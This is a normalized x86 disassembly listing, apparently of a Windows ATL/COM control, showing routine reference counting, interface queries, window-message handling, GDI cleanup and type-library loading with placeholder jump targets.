mov esi eax
test esi esi
jge r-xdata
sub_4050a0
push 0xffffffff
push sub_42f4f3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax ecx
xor ecx ecx
mov [ esp ] eax
mov [ eax ] ecx
mov [ esp + 0xc ] ecx
mov [ eax + 0x4 ] ecx
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4050e0
push 0xffffffff
push sub_42f513
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0xffffffff
mov esi [ esi ]
test esi esi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov edx [ esi ]
push esi
call [ edx + 0x8 ]
sub_405140
push 0xffffffff
push sub_42f528
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov esi ecx
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x14 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
test eax eax
mov edi [ esi + 0x4 ]
je r-xdata
push 0x80004003
call sub_42cee0
lea eax [ esp + 0x8 ]
push eax
push r--data
mov [ esp + 0x10 ] 0x0
mov edx [ edi ]
push edi
call [ edx ]
mov edi eax
test edi edi
jge r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
mov [ esp + 0x14 ] 0xffffffff
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
lea ecx [ esi + 0x8 ]
push ecx
mov ecx [ esi + 0x18 ]
push ecx
mov ecx [ esp + 0x10 ]
push 0x0
push ecx
mov ecx [ esp + 0x2c ]
push 0x0
push ecx
push eax
call [ edx + 0x2c ]
mov esi eax
mov [ esp + 0x14 ] 0xffffffff
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
push 0x80004003
call sub_42cee0
mov eax edi
pop edi
pop esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
sub_405230
push 0xffffffff
push sub_42f559
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] 0x0
mov eax [ ecx ]
test eax eax
push esi
mov esi [ esp + 0x18 ]
mov [ esi ] eax
je r-xdata
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_405280
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push 0x80004003
call sub_42cee0
mov eax esi
pop esi
retn 0x4
mov [ esi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4052e0
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push 0x80004003
call sub_42cee0
mov eax esi
pop esi
retn 0x4
mov [ esi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_405310
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push 0x80004003
call sub_42cee0
mov eax esi
pop esi
retn 0x4
mov [ esi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_405340
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0x1fffffff
jbe r-xdata
xor al al
pop esi
retn 0x4
push edi
lea edi [ eax * 8 ]
push edi
call sub_42e3bc
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_404820
sub_405390
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_4053d0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
test [ esp + 0x8 ] 0x1
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_405450
push esi
push edi
mov esi ecx
lea edi [ esi + 0x8 ]
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi ]
pop edi
pop esi
retn
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
push esi
call ??3@YAXPAX@Z
add esp 0x4
push eax
call ??_V@YAXPAX@Z
add esp 0x4
sub_4054a0
push 0xffffffff
push sub_42f57b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esi + 0x4 ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0xc ] r--data
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi + 0x28 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x2c ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_405550
push esi
push edi
mov edi [ esp + 0xc ]
lea esi [ ecx + 0x28 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi ] 0x0
je r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
mov ecx esi
call sub_4046f0
pop edi
pop esi
mov [ esp + 0x4 ] eax
jmp [ InterlockedIncrement@IAT ]
sub_405590
push esi
mov esi [ esp + 0xc ]
push edi
mov ecx 0x4
mov edi r--data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
pop edi
mov eax 0x80004002
pop esi
retn 0x10
mov esi [ esp + 0xc ]
mov eax [ esi + 0x34 ]
add esi 0x34
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push 0x1
push 0x0
push r--data
mov ecx esi
call sub_405010
test eax eax
jge r-xdata
mov edx [ esp + 0x18 ]
mov [ edx ] eax
mov esi [ esi ]
test esi esi
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi ]
push esi
call [ eax + 0x4 ]
pop edi
xor eax eax
pop esi
retn 0x10
push 0x80004003
call sub_42cee0
pop edi
xor eax eax
pop esi
retn 0x10
mov [ esi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_405620
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42f5a0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ esp + 0x24 ]
cmp edi 0x200
je r-xdata
xor ebx ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x1c ] ebx
lea edx [ esp + 0xc ]
push edx
call sub_405230
mov esi eax
mov [ esp + 0x1c ] 0x1
cmp [ esi ] ebx
jne r-xdata
cmp edi 0x201
je r-xdata
mov eax [ esp + 0x24 ]
cmp eax ebx
mov esi [ esi ]
je r-xdata
push 0x80004003
call sub_42cee0
cmp edi 0x202
je r-xdata
lea eax [ esp + 0x24 ]
push eax
push r--data
mov [ esp + 0x2c ] ebx
mov edx [ esi ]
push esi
call [ edx ]
mov [ esp + 0x1c ] bl
mov eax [ esp + 0xc ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp edi 0x203
je r-xdata
mov eax [ esp + 0x24 ]
cmp eax ebx
jne r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp edi 0x205
je r-xdata
mov edx [ eax ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x30 ]
push ecx
mov ecx [ esp + 0x30 ]
push ecx
push edi
push eax
call [ edx + 0x24 ]
cmp eax ebx
jl r-xdata
push 0x80004003
call sub_42cee0
mov eax [ esp + 0x24 ]
cmp edi 0x206
je r-xdata
mov eax [ esp + 0x30 ]
mov [ eax ] ebx
mov [ esp + 0x1c ] 0xffffffff
mov eax [ esp + 0x24 ]
cmp eax ebx
je r-xdata
mov esi [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
mov eax [ esp + 0x24 ]
cmp eax ebx
je r-xdata
cmp edi 0x207
je r-xdata
mov ecx [ esp + 0x14 ]
pop edi
pop esi
xor eax eax
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x10
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
pop edi
mov eax esi
pop esi
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x10
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
cmp edi 0x208
je r-xdata
cmp edi 0x209
je r-xdata
cmp edi 0x20a
je r-xdata
cmp edi 0x100
je r-xdata
cmp edi 0x101
je r-xdata
cmp edi 0x102
je r-xdata
cmp edi 0x20
je r-xdata
mov eax [ esp + 0x30 ]
mov [ eax ] 0x0
jmp r-xdata
sub_4057b0
push 0xffffffff
push sub_42f5d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push ebp
push esi
xor ebx ebx
push edi
mov esi ecx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x24 ] 0x1
lea eax [ esp + 0x18 ]
push eax
call sub_405230
mov edi eax
mov [ esp + 0x24 ] 0x2
cmp [ edi ] ebx
jne r-xdata
mov eax [ esp + 0x10 ]
cmp eax ebx
mov edi [ edi ]
je r-xdata
push 0x80004003
call sub_42cee0
lea eax [ esp + 0x10 ]
push eax
push r--data
mov [ esp + 0x18 ] ebx
mov edx [ edi ]
push edi
call [ edx ]
mov ebp eax
mov [ esp + 0x24 ] 0x1
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp ebp ebx
jge r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x10 ]
cmp eax ebx
mov edi [ esp + 0x2c ]
jne r-xdata
lea edx [ esp + 0x18 ]
push edx
mov ecx esi
call sub_405230
mov edi eax
mov [ esp + 0x24 ] 0x3
cmp [ edi ] ebx
jne r-xdata
mov ecx [ esp + 0x30 ]
mov edx [ eax ]
push ecx
push edi
push eax
call [ edx + 0x1c ]
mov ebp eax
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebx
mov edi [ edi ]
je r-xdata
push 0x80004003
call sub_42cee0
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
cmp edi eax
je r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi + 0xc ]
mov edx [ edi ]
sub eax ecx
mov ecx [ edi + 0x8 ]
mov edi [ esi + 0x68 ]
sub ecx edx
sub edi [ esi + 0x60 ]
mov edx [ esi + 0x64 ]
sub edx [ esi + 0x5c ]
cmp edx ecx
jne r-xdata
lea eax [ esp + 0x14 ]
push eax
push r--data
mov [ esp + 0x1c ] ebx
mov edx [ edi ]
push edi
call [ edx ]
mov ebp eax
mov [ esp + 0x24 ] 0x1
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esi + 0x58 ]
cmp eax ebx
mov edi [ DeleteObject@IAT ]
je r-xdata
push eax
call [ DeleteDC@IAT ]
xor edx edx
cmp ebp ebx
setge dl
mov esi edx
mov [ esp + 0x24 ] bl
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
cmp ebp ebx
jge r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esi + 0x74 ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esp + 0x24 ] 0xffffffff
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ esp + 0x24 ] bl
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x78 ]
cmp eax ebx
je r-xdata
push eax
call [ DeleteDC@IAT ]
mov ecx [ esp + 0x1c ]
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x18
retn 0x8
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov [ esp + 0x24 ] 0xffffffff
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x74 ] ebx
mov [ esi + 0x78 ] ebx
mov [ esi + 0x58 ] ebx
push eax
call edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
add esp 0x18
retn 0x8
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4059b0
push esi
push edi
mov edi ecx
mov esi [ edi + 0x84 ]
mov ecx [ edi + 0x88 ]
xor eax eax
cmp esi ecx
je r-xdata
pop edi
pop esi
retn 0x8
push ebx
mov ebx [ esp + 0x14 ]
push ebp
mov ebp [ esp + 0x14 ]
mov ecx [ esi ]
mov eax [ ecx ]
push ebx
push ebp
call [ eax + 0x4 ]
mov ecx [ edi + 0x88 ]
add esi 0x8
cmp esi ecx
jne r-xdata
pop ebp
pop ebx
sub_4059f0
push esi
mov esi ecx
call sub_403d70
mov ecx [ r--data ]
lea eax [ esi + 0x4 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov edx [ r--data ]
mov [ eax + 0xc ] edx
mov ecx [ r--data ]
lea eax [ esi + 0x14 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov edx [ r--data ]
mov [ eax + 0xc ] edx
xor eax eax
mov [ esi + 0x24 ] ax
mov [ esi + 0x26 ] ax
mov eax esi
pop esi
retn
sub_405a60
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push 0x1
push eax
call [ ecx + 0x18 ]
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
mov [ esi + 0x4 ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ esi ] 0x0
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
sub_405ab0
push 0xffffffff
push sub_42f612
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
mov [ esp + 0x8 ] esi
mov [ esp + 0x14 ] 0x0
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
mov [ esp + 0x14 ] 0xffffffff
test esi esi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
xor ecx ecx
call sub_4054a0
mov ecx [ esp + 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
lea ecx [ esi + 0x4 ]
call sub_4054a0
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_405b20
push 0xffffffff
push sub_42f628
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
call sub_405ab0
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405b60
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_405bf0
push 0xffffffff
push sub_42f64b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push edi
xor edi edi
mov [ esi + 0x10 ] edi
mov [ esi ] r--data
mov [ esi + 0x4 ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0xc ] r--data
mov [ esp + 0x8 ] esi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esp + 0x14 ] edi
mov eax [ esi + 0x2c ]
cmp eax edi
je r-xdata
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x14 ] edi
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi + 0x28 ]
cmp ecx edi
je r-xdata
mov eax [ esi + 0x2c ]
cmp eax edi
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_405ca0
push 0xffffffff
push sub_42f68e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x240
mov ecx [ esp + 0x258 ]
push esi
push edi
lea eax [ esp + 0x148 ]
push ecx
lea ecx [ esp + 0x148 ]
mov [ esp + 0x148 ] eax
call sub_403a70
mov [ esp + 0x250 ] 0x0
mov edx [ esp + 0x144 ]
push edx
lea ecx [ esp + 0xc ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov esi eax
mov [ esp + 0x250 ] 0x1
mov ecx [ esp + 0x25c ]
lea eax [ esp + 0x44 ]
push ecx
lea ecx [ esp + 0x44 ]
mov [ esp + 0x44 ] eax
call sub_403a70
mov [ esp + 0x250 ] 0x2
mov edx [ esp + 0x40 ]
push edx
lea ecx [ esp + 0x28 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x250 ] 0x3
push esi
push eax
mov eax [ esp + 0x260 ]
mov ecx [ eax + 0x2c ]
call sub_4059b0
mov esi eax
mov [ esp + 0x250 ] 0x2
lea ecx [ esp + 0x24 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x250 ] 0x1
mov eax [ esp + 0x40 ]
mov edi [ free@IAT ]
lea ecx [ esp + 0x44 ]
cmp eax ecx
je r-xdata
mov [ esp + 0x250 ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x250 ] 0xffffffff
mov eax [ esp + 0x144 ]
lea edx [ esp + 0x148 ]
cmp eax edx
je r-xdata
push eax
call edi
add esp 0x4
mov ecx [ esp + 0x248 ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x24c
retn 0xc
push eax
call edi
add esp 0x4
sub_405e20
push esi
mov esi [ esp + 0x10 ]
test esi esi
jne r-xdata
mov eax [ esp + 0xc ]
mov [ esi ] 0x0
mov ecx [ eax ]
cmp ecx [ r--data ]
push edi
jne r-xdata
mov eax 0x80004003
pop esi
retn 0xc
cmp ecx 0xd27cdb6d
mov edx [ esp + 0xc ]
jne r-xdata
mov edx [ eax + 0x4 ]
cmp edx [ r--data ]
jne r-xdata
test ecx ecx
jne r-xdata
mov edi [ eax + 0x4 ]
cmp edi [ r--data ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp edx [ r--data ]
jne r-xdata
cmp ecx 0x20400
jne r-xdata
mov edi [ eax + 0x4 ]
test edi edi
jne r-xdata
mov edi [ eax + 0x8 ]
cmp edi [ r--data ]
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ r--data ]
jne r-xdata
cmp ecx [ edx + 0x14 ]
jne r-xdata
mov edi [ eax + 0x4 ]
cmp edi [ r--data ]
jne r-xdata
cmp [ eax + 0x8 ] 0xc0
jne r-xdata
mov edi [ eax + 0xc ]
cmp edi [ r--data ]
je r-xdata
pop edi
mov eax 0x80004002
pop esi
retn 0xc
pop edi
mov eax 0x80004002
pop esi
retn 0xc
mov ecx [ eax + 0x4 ]
cmp ecx [ edx + 0x18 ]
jne r-xdata
mov edi [ eax + 0x8 ]
cmp edi [ r--data ]
jne r-xdata
cmp [ eax + 0xc ] 0x46000000
je r-xdata
mov [ esi ] edx
mov ecx [ edx ]
push edx
call [ ecx + 0x4 ]
pop edi
xor eax eax
pop esi
retn 0xc
mov ecx [ eax + 0x8 ]
cmp ecx [ edx + 0x1c ]
jne r-xdata
mov edi [ eax + 0xc ]
cmp edi [ r--data ]
je r-xdata
mov eax [ eax + 0xc ]
cmp eax [ edx + 0x20 ]
je r-xdata
sub_405f40
push ecx
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x48 ]
mov edx [ esi + 0x1c ]
push edi
push eax
lea ecx [ esi + 0x34 ]
push ecx
push edx
call [ Ordinal_ATL71_11@IAT ]
mov [ esi + 0x48 ] 0xfefefefe
mov eax [ esi + 0x1c ]
xor ebx ebx
cmp eax ebx
jne r-xdata
mov edi [ esi + 0x1c ]
mov eax [ edi ]
lea ecx [ esp + 0xc ]
push ecx
push edi
mov [ esp + 0x14 ] ebx
call [ eax + 0x90 ]
cmp eax ebx
jge r-xdata
push 0x80004003
call sub_42cee0
cmp [ esp + 0xc ] bx
je r-xdata
push r--data
push edi
push eax
call sub_42cef0
mov eax [ esi + 0x1c ]
cmp eax ebx
je r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
mov eax [ esi ]
cmp eax ebx
je r-xdata
mov [ esi + 0x1c ] ebx
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov edi [ esi + 0x1c ]
mov edx [ edi ]
push edi
call [ edx + 0x74 ]
cmp eax ebx
jge r-xdata
push 0x80004003
call sub_42cee0
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov edx [ eax ]
push 0x1
push eax
call [ edx + 0x18 ]
mov eax [ esi ]
cmp eax ebx
je r-xdata
push r--data
push edi
push eax
call sub_42cef0
mov eax [ esi + 0x54 ]
cmp eax ebx
push ebp
mov ebp [ DeleteDC@IAT ]
je r-xdata
mov [ esi + 0x4 ] ebx
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov [ esi ] ebx
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esi + 0x58 ]
cmp eax ebx
mov edi [ DeleteObject@IAT ]
je r-xdata
push eax
call ebp
mov eax [ esi + 0x74 ]
cmp eax ebx
je r-xdata
push eax
call edi
mov eax [ esi + 0x78 ]
cmp eax ebx
pop ebp
je r-xdata
push eax
call ebp
lea ecx [ esi + 0x94 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::clear@IAT ]
pop edi
mov [ esi + 0x54 ] ebx
mov [ esi + 0x74 ] ebx
mov [ esi + 0x78 ] ebx
mov [ esi + 0x58 ] ebx
pop esi
pop ebx
pop ecx
retn
push eax
call edi
sub_406080
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
mov esi ecx
jne r-xdata
mov ecx [ esi + 0xc ]
xor eax eax
test ecx ecx
jne r-xdata
pop edi
mov eax 0x80004003
pop esi
retn 0x8
mov ecx [ esi + 0xc ]
mov [ edi ] ecx
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
mov eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_4060d0
pop edi
pop esi
retn 0x8
mov esi ecx
mov edx [ esi ]
push esi
call [ edx + 0x4 ]
xor eax eax
sub_4060d0
push 0xffffffff
push sub_42f719
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x224
mov eax [ rw-data ]
push ebx
push esi
mov esi ecx
mov [ esp + 0x228 ] eax
mov eax [ esi + 0xc ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
add eax 0x10
push edi
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] bl
mov [ esp + 0x238 ] ebx
mov eax [ esp + 0x1c ]
push eax
call [ EnterCriticalSection@IAT ]
cmp [ esi + 0xc ] ebx
mov [ esp + 0x20 ] 0x1
mov edi 0x80004005
jne r-xdata
cmp [ esi + 0x14 ] ebx
je r-xdata
xor edi edi
mov eax [ esi + 0x4 ]
mov ecx [ rw-data ]
mov [ esp + 0x14 ] ebx
cmp ecx [ eax ]
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esp + 0x238 ] 0xffffffff
cmp [ esp + 0x20 ] bl
je r-xdata
cmp [ esi + 0x14 ] ebx
jne r-xdata
mov edx [ esp + 0x240 ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
xor ecx ecx
mov cx [ esi + 0xa ]
xor edx edx
mov dx [ esi + 0x8 ]
push ecx
push edx
push eax
call [ LoadRegTypeLib@IAT ]
mov edi eax
mov edx [ rw-data ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov ecx [ esp + 0x22c ]
pop esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x224 ]
pop ebx
call sub_42e72f
add esp 0x230
retn 0x4
mov eax edi
pop edi
mov eax [ esp + 0x1c ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ esp + 0x20 ] bl
push eax
mov ecx esi
call sub_4063f0
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
mov [ esp + 0xc ] ebx
mov [ esp + 0x238 ] 0x3
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
lea edx [ esp + 0xc ]
push edx
mov edx [ esi ]
push edx
push eax
call [ ecx + 0x18 ]
mov edi eax
cmp edi ebx
jl r-xdata
mov ecx [ rw-data ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ esp + 0x238 ] bl
mov eax [ esp + 0xc ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0xc ]
cmp eax ebx
mov [ esp + 0x18 ] eax
je r-xdata
mov edx [ rw-data ]
cmp edx [ eax + 0xc ]
jne r-xdata
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
jmp r-xdata
mov [ esp + 0x238 ] 0x5
mov [ esp + 0x10 ] ebx
mov [ esp + 0x238 ] 0x7
mov eax [ esp + 0xc ]
mov edx [ eax ]
lea ecx [ esp + 0x10 ]
push ecx
push r--data
push eax
call [ edx ]
test eax eax
jl r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
mov ecx 0xffff
cmp [ esi + 0x8 ] cx
jne r-xdata
mov eax [ esp + 0x18 ]
mov [ esi + 0xc ] eax
mov eax [ rw-data ]
cmp eax ebx
mov [ esp + 0x18 ] ebx
je r-xdata
mov edx [ esp + 0x10 ]
push r--data
push edx
lea eax [ esp + 0x20 ]
push eax
call [ Ordinal_ATL71_31@IAT ]
